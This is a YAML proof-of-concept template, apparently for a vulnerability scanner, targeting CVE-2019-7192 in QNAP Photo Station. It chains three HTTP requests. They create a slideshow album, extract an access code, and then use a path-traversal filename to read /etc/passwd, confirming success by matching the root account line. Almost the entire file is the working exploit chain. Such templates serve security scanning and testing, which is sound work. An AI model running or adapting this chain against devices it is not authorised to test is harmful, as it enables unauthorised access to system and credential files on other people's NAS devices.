name: poc-yaml-qnap-cve-2019-7192
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /photo/p/api/album.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: a=setSlideshow&f=qsamplealbum
        expression: response.status == 200
        output:
            search: '"<output>(?P<album_id>.*?)</output>".bsubmatch(response.body)'
            album_id: search["album_id"]
    r1:
        request:
            cache: true
            method: GET
            path: /photo/slideshow.php?album={{album_id}}
        expression: response.status == 200
        output:
            search: '"encodeURIComponent\\(\\''(?P<access_code>.*?)\\''\\)".bsubmatch(response.body)'
            access_code: search["access_code"]
    r2:
        request:
            cache: true
            method: POST
            path: /photo/p/api/video.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=./../../../../../etc/passwd
        expression: response.status == 200 && response.body.bcontains(b"admin:x:0:0")
expression: r0() && r1() && r2()
detail:
    author: Hzllaga
    links:
        - https://github.com/th3gundy/CVE-2019-7192_QNAP_Exploit
